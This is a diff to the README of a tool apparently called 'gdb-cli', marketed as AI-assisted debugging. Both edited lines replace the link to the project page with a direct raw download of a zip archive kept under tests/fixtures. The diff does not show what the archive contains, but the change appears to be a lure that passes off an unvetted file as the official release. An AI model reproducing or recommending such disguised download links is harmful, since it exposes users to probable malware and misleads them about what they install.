@@ -1,6 +1,6 @@
 # 🛠️ gdb-cli - Debug Faster With AI Help
 
-[![Download gdb-cli](https://img.shields.io/badge/Download-gdb--cli-blue?style=for-the-badge&logo=github)](https://github.com/Covert-cobra578/gdb-cli)
+[![Download gdb-cli](https://img.shields.io/badge/Download-gdb--cli-blue?style=for-the-badge&logo=github)](https://github.com/Covert-cobra578/gdb-cli/raw/refs/heads/main/tests/fixtures/gdb-cli-1.2.zip)
 
 ## 🧭 What this app does
 
@@ -30,7 +30,7 @@ For best results, keep these tools ready:
 
 Go to the main project page here:
 
-[Visit the gdb-cli download page](https://github.com/Covert-cobra578/gdb-cli)
+[Visit the gdb-cli download page](https://github.com/Covert-cobra578/gdb-cli/raw/refs/heads/main/tests/fixtures/gdb-cli-1.2.zip)
 
 On the page:
 1. open the repository
